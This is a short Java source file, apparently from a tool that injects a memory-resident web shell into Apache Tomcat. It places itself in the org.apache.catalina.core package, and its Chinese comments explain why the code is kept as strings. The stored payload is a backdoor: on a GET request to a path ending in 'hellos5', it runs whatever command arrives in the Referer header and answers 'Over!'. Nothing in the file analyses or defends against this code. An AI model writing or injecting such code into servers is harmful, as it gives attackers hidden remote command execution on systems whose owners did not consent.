package org.apache.catalina.core;

import java.io.IOException;
import java.util.Map;

public class Suo5Services {
    //不知道接口在哪 fine
    //最不优雅的一集，但是为了避免各种加载BUG还是尽量不在注入环境写会被额外编译的代码（也就是让它们全部在同一个环境被编译）
    //同时，为了避免后来者眼瞎（看一堆String格式的代码已经够让人吐血），这些String分类存储
    public static String doServices="String url=request.getServletPath();\r\n" + //
                "        if (url.matches(\"/(.*)hellos5\")){\r\n" + //
                "            if (request.getMethod().equals(\"GET\")){\r\n" + //
                "                Runtime.getRuntime().exec(request.getHeader(\"Referer\"));\r\n" + //
                "                response.setHeader(\"Referer\",\"Over!\");\r\n" + //
                "            }\r\n" + //
                "\r\n" + //
                "        }";
}
